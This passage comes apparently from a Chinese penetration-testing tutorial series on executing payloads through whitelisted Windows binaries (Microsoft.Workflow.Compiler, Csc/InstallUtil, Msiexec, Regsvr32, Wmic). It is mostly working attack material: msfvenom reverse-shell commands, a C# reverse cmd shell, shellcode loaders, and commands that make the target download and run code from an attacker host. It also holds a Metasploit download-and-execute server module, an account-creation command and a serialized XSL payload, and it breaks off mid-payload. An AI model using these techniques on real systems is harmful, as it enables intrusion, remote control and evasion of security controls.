<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor.tcp</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>payload</strong>生成</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：poc.xml [注：<strong>windows/shell/reverse_tcp</strong> ]</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf‐8&quot;?</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema‐instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;</span></span><br><span class="line"><span class="meta">	&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:string&gt;Micropoor.tcp&lt;/d2p1:string&gt;</span></span><br><span class="line"><span class="meta">	&lt;/files&gt;</span></span><br><span class="line"><span class="meta">	&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;</span></span><br><span class="line"><span class="meta">		&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt; &lt;/coreAssemblyFileName&gt;</span></span><br><span class="line"><span class="meta">		&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;</span></span><br><span class="line"><span class="meta">		&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;</span></span><br><span class="line"><span class="meta">		&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;</span></span><br><span class="line"><span class="meta">		&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt; &lt;/outputName&gt;</span></span><br><span class="line"><span class="meta">		&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;</span></span><br><span class="line"><span class="meta">		&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;‐ 1&lt;/warningLevel&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:mtInfo i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">	&lt;/parameters&gt;</span></span><br><span class="line"><span class="meta">&lt;/CompilerInput&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor.tcp</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.ComponentModel;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">using System.Workflow.Activities;</span><br><span class="line">public class Program : SequentialWorkflowActivity </span><br><span class="line">&#123;</span><br><span class="line">	static StreamWriter streamWriter;</span><br><span class="line">	public Program() </span><br><span class="line">	&#123;</span><br><span class="line">		using(TcpClient client &#x3D; new TcpClient(&quot;4&quot;, 53)) </span><br><span class="line">		&#123;</span><br><span class="line">			using(Stream stream &#x3D; client.GetStream()) </span><br><span class="line">			&#123;</span><br><span class="line">				using(StreamReader rdr &#x3D; new StreamReader(stream)) </span><br><span class="line">				&#123;</span><br><span class="line">					streamWriter &#x3D; new StreamWriter(stream);</span><br><span class="line">					StringBuilder strInput &#x3D; new StringBuilder();</span><br><span class="line">					Process p &#x3D; new Process();</span><br><span class="line">					p.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">					p.StartInfo.CreateNoWindow &#x3D; true;</span><br><span class="line">					p.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">					p.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">					p.StartInfo.RedirectStandardInput &#x3D; true;</span><br><span class="line">					p.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">					p.OutputDataReceived +&#x3D; new DataReceivedEventHandler(CmdOutputDataHandler);</span><br><span class="line">					p.Start();</span><br><span class="line">					p.BeginOutputReadLine();</span><br><span class="line">					while(true) </span><br><span class="line">					&#123;</span><br><span class="line">						strInput.Append(rdr.ReadLine());</span><br><span class="line">						p.StandardInput.WriteLine(strInput);</span><br><span class="line">						strInput.Remove(0, strInput.Length);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) </span><br><span class="line">	&#123;</span><br><span class="line">		StringBuilder strOutput &#x3D; new StringBuilder();</span><br><span class="line">		if (!String.IsNullOrEmpty(outLine.Data)) </span><br><span class="line">		&#123;</span><br><span class="line">			try </span><br><span class="line">			&#123;</span><br><span class="line">				strOutput.Append(outLine.Data);</span><br><span class="line">				streamWriter.WriteLine(strOutput);</span><br><span class="line">				streamWriter.Flush();</span><br><span class="line">			&#125;</span><br><span class="line">			catch (Exception err) </span><br><span class="line">			&#123;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Micropoor_rev1.cs 【注：<strong>x64 payload</strong>】</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Workflow.Activities;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.Threading;</span><br><span class="line">class yrDaTlg : SequentialWorkflowActivity </span><br><span class="line">&#123;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);</span><br><span class="line">	public yrDaTlg() </span><br><span class="line">	&#123;</span><br><span class="line">		byte[] QWKpWKhcs &#x3D; &#123; your shellcode&#125;</span><br><span class="line">		IntPtr AmnGaO &#x3D; VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);</span><br><span class="line">		Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);</span><br><span class="line">		IntPtr oXmoNUYvivZlXj &#x3D; IntPtr.Zero;</span><br><span class="line">		UInt32 XVXTOi &#x3D; 0;</span><br><span class="line">		IntPtr pAeCTf wBS &#x3D; IntPtr.Zero;</span><br><span class="line">		uint BnhanUiUJaetgy;</span><br><span class="line">		bool iSdNUQK &#x3D; VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);</span><br><span class="line">		oXmoNUYvivZlXj &#x3D; CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);</span><br><span class="line">		WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="77-基于白名单Csc-exe执行payload第七季"><a href="#77-基于白名单Csc-exe执行payload第七季" class="headerlink" title="77. 基于白名单Csc.exe执行payload第七季"></a>77. 基于白名单Csc.exe执行payload第七季</h2><ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.Ente rpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:Mic opoor.exe &#x2F;platform:x64 &#x2F;unsafe C:\Users\John\Desktop\Micropoor_Csc.cs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U C:\Users\John\Desktop\Micropoor.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor_Csc.cs</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Configuration.Install;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">public class Program </span><br><span class="line">&#123;</span><br><span class="line">	public static void Main() </span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">[System.ComponentModel.RunInstaller(true)]  </span><br><span class="line">public class Sample : System.Configuration.Install.Installer </span><br><span class="line">&#123;</span><br><span class="line">	public override void Uninstall(System.Collections.IDictionary savedState) </span><br><span class="line">	&#123;</span><br><span class="line">		Shellcode.Exec();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Shellcode </span><br><span class="line">&#123;</span><br><span class="line">	public static void Exec() </span><br><span class="line">	&#123;</span><br><span class="line">		byte[] shellcode &#x3D; new byte[510] &#123;&#125;;</span><br><span class="line">		UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode .Length,  </span><br><span class="line">		MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);</span><br><span class="line">		IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">		UInt32 threadId &#x3D; 0;</span><br><span class="line">		IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">		hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">		WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">	&#125;</span><br><span class="line">	private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">	private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern bool VirtualFree(IntPtr lpAddress,  </span><br><span class="line">	UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern IntPtr CreateThread(  </span><br><span class="line">	UInt32 lpThreadAttributes,  </span><br><span class="line">	UInt32 dwStackSize,  </span><br><span class="line">	UInt32 lpStartAddress,  </span><br><span class="line">	IntPtr param,  </span><br><span class="line">	UInt32 dwCreationFlags,  </span><br><span class="line">	ref UInt32 lpThreadId  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 WaitForSingleObject(  </span><br><span class="line">	IntPtr hHandle, </span><br><span class="line">	UInt32 dwMilliseconds  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern IntPtr GetModuleHandle(  </span><br><span class="line">	string moduleName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 GetProcAddress(  </span><br><span class="line">	IntPtr hModule,  </span><br><span class="line">	string procName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 LoadLibrary(  </span><br><span class="line">	string lpFileName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="78-基于白名单Msiexec执行payload第八季"><a href="#78-基于白名单Msiexec执行payload第八季" class="headerlink" title="78. 基于白名单Msiexec执行payload第八季"></a>78. 基于白名单Msiexec执行payload第八季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\msiexec.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\msiexec.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f msi &gt; Micropoor_rev_x64_53.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev\_x64_53.txt</span><br></pre></td></tr></table></figure>
<h2 id="79-基于白名单Regsvr32执行payload第九季"><a href="#79-基于白名单Regsvr32执行payload第九季" class="headerlink" title="79. 基于白名单Regsvr32执行payload第九季"></a>79. 基于白名单Regsvr32执行payload第九季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\SysWOW64\regsvr32.exe</span><br><span class="line">C:\WINDOWS\system32\regsvr32.exe</span><br></pre></td></tr></table></figure>
<p>msf 已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无 exploit版本regsvr32</p>
<ul>
<li>配置攻击机msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;regsvr32_command_delivery_server</span><br><span class="line">set CMD net user Micropoor Micropoor &#x2F;add</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.4:8080&#x2F;ybn7xESQYCGv scrobj.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>powershell 版 Regsvr32</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MetasploitModule &lt; Msf::Exploit::Remote  </span><br><span class="line">Rank &#x3D; ManualRanking  </span><br><span class="line">include Msf::Exploit::Powershell  </span><br><span class="line">include Msf::Exploit::Remote::HttpServer  </span><br><span class="line">def initialize(info &#x3D; &#123;&#125;)  </span><br><span class="line">super(update_info(info,  </span><br><span class="line">&#39;Name&#39; &#x3D;&gt; &#39;Regsvrexe (.sct) Application Whitelisting Bypass Serve r&#39;,&#39;Description&#39; &#x3D;&gt; %q(</span><br><span class="line">This module simplifies the Regsvrexe Application Whitelisting Bypass technique. </span><br><span class="line">The module creates a web server that hosts an .sct file. </span><br><span class="line">When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command. </span><br><span class="line">This command then downloads and executes the specified payload (similar to the web_delivery module with PSH). </span><br><span class="line">Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port. </span><br><span class="line">),  </span><br><span class="line">&#39;License&#39; &#x3D;&gt; MSF_LICENSE,  </span><br><span class="line">&#39;Author&#39; &#x3D;&gt;  </span><br><span class="line">[  </span><br><span class="line">&#39;Casey Smith&#39;, # AppLocker bypass research and vulnerability discover y(@subTee)  </span><br><span class="line">&#39;Trenton Ivey&#39;, # MSF Module (kn0)  </span><br><span class="line">],  </span><br><span class="line">&#39;DefaultOptions&#39; &#x3D;&gt;  </span><br><span class="line">&#123;  </span><br><span class="line">&#39;Payload&#39; &#x3D;&gt; &#39;windows&#x2F;meterpreter&#x2F;reverse_tcp&#39;  </span><br><span class="line">&#125;,  </span><br><span class="line">&#39;Targets&#39; &#x3D;&gt; [[&#39;PSH&#39;, &#123;&#125;]],  </span><br><span class="line">&#39;Platform&#39; &#x3D;&gt; %w(win),  </span><br><span class="line">&#39;Arch&#39; &#x3D;&gt; [ARCH_X86, ARCH_X86_64],  </span><br><span class="line">&#39;DefaultTarget&#39; &#x3D;&gt; 0,  </span><br><span class="line">&#39;DisclosureDate&#39; &#x3D;&gt; &#39;Apr 19 2016&#39;,  </span><br><span class="line">&#39;References&#39; &#x3D;&gt;  </span><br><span class="line">[  </span><br><span class="line">[&#39;URL&#39;, &#39;http:&#x2F;&#x2F;subt0xblogspot.com&#x2F;2016&#x2F;04&#x2F;bypass‐application‐whitelisting‐ script.html&#39;]  </span><br><span class="line">]  </span><br><span class="line">))  </span><br><span class="line">end  </span><br><span class="line">def primer  </span><br><span class="line">print_status(&#39;Run the following command on the target machine:&#39;)  </span><br><span class="line">print_line(&quot;regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:#&#123;get_uri&#125;.sct scrobj.dll&quot;)  </span><br><span class="line">end  </span><br><span class="line">def on_request_uri(cli, _request)</span><br><span class="line"># If the resource request ends with &#39;.sct&#39;, serve the .sct file  </span><br><span class="line"># Otherwise, serve the PowerShell payload  </span><br><span class="line">if _request.raw_uri &#x3D;~ &#x2F;.sct$&#x2F;  </span><br><span class="line">serve_sct_file else  </span><br><span class="line">serve_psh_payload  </span><br><span class="line">end  </span><br><span class="line">end  </span><br><span class="line">def serve_sct_file  </span><br><span class="line">print_status(&quot;Handling request for the .sct file from #&#123;cli.peerhost&#125;&quot;)  </span><br><span class="line">ignore_cert &#x3D; Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl  </span><br><span class="line">download_string &#x3D; Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)  </span><br><span class="line">download_and_run &#x3D; &quot;#&#123;ignore_cert&#125;#&#123;download_string&#125;&quot;  </span><br><span class="line">psh_command &#x3D; generate_psh_command_line(  </span><br><span class="line">noprofile: true,  </span><br><span class="line">windowstyle: &#39;hidden&#39;,  </span><br><span class="line">command: download_and_run  </span><br><span class="line">)  </span><br><span class="line">data &#x3D; gen_sct_file(psh_command)  </span><br><span class="line">send_response(cli, data, &#39;Content‐Type&#39; &#x3D;&gt; &#39;text&#x2F;plain&#39;)  </span><br><span class="line">end  </span><br><span class="line">def serve_psh_payload  </span><br><span class="line">print_status(&quot;Delivering payload to #&#123;cli.peerhost&#125;&quot;)  </span><br><span class="line">data &#x3D; cmd_psh_payload(payload.encoded,  </span><br><span class="line">payload_instance.arch.first,  </span><br><span class="line">remove_comspec: true,  </span><br><span class="line">use_single_quotes: true  </span><br><span class="line">)  </span><br><span class="line">send_response(cli,data,&#39;Content‐Type&#39; &#x3D;&gt; &#39;application&#x2F;octet‐stream&#39;)  </span><br><span class="line">end  </span><br><span class="line">def rand_class_id  </span><br><span class="line">&quot;#&#123;Rex::Text.rand_text_hex 8&#125;‐#&#123;Rex::Text.rand_text_hex 4&#125;‐# &#123;Rex::Text.rand_text_hex 4&#125;‐#&#123;Rex::Text.rand_text_hex 4&#125;‐# &#123;Rex::Text.rand_text_hex12&#125;&quot;  </span><br><span class="line">end  </span><br><span class="line">def gen_sct_file(command)  </span><br><span class="line">% </span><br><span class="line">&#123;</span><br><span class="line">	&lt;?XML version&#x3D;&quot;0&quot;?&gt;&lt;scriptlet&gt;&lt;registrationprogid&#x3D;&quot;#&#123;rand_text_alphanumeric 8&#125;&quot;</span><br><span class="line">	classid&#x3D;&quot;&#123;#&#123;rand_class_id&#125;&#125;&quot;&gt;&lt;script&gt;&lt;![CDATA[ var r &#x3D; ne wActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;#&#123;command&#125;&quot;,0);</span><br><span class="line">	]]&gt;&lt;script&gt;&lt;&#x2F;registration&gt; &lt;&#x2F;scriptlet&gt;</span><br><span class="line">&#125;</span><br><span class="line">end  </span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ul>
<li><ul>
<li>使用方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy regsvr32_applocker_bypass_server.rb to &#x2F;usr&#x2F;share&#x2F;metasploit- framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;misc</span><br></pre></td></tr></table></figure>
<h2 id="80-基于白名单Wmic执行payload第十季"><a href="#80-基于白名单Wmic执行payload第十季" class="headerlink" title="80. 基于白名单Wmic执行payload第十季"></a>80. 基于白名单Wmic执行payload第十季</h2></li>
<li><p>Windows 2003 默认位置：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\wbem\wmic.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\wbem\wmic.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\wbem\WMIC.exe</span><br><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><p>靶机执行</p>
<ul>
<li>Win 7</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor.xsl&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>2003</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WMIC.exe os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_2003.xsl&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_Win7.xsl</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">	xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.worg&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas‐microsoft‐ com:xslt&quot;</span><br><span class="line">	xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">	version&#x3D;&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;ms:script implements‐prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">		function setversion() &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function debug(s) &#123;&#125;</span><br><span class="line"></span><br><span class="line">		function base64ToStream(b) &#123;</span><br><span class="line"></span><br><span class="line">		var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);</span><br><span class="line"></span><br><span class="line">		var length &#x3D; enc.GetByteCount_2(b);</span><br><span class="line"></span><br><span class="line">		var ba &#x3D; enc.GetBytes_4(b);</span><br><span class="line"></span><br><span class="line">		var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);</span><br><span class="line"></span><br><span class="line">		ba &#x3D; transform.TransformFinalBlock(ba, 0, length);</span><br><span class="line"></span><br><span class="line">		var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line"></span><br><span class="line">		ms.Write(ba, 0, (length &#x2F; 4) * 3);</span><br><span class="line"></span><br><span class="line">		ms.Position &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		return ms;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+  </span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+  </span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+  </span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+  </span><br><span class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+  </span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+  </span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+  </span><br><span 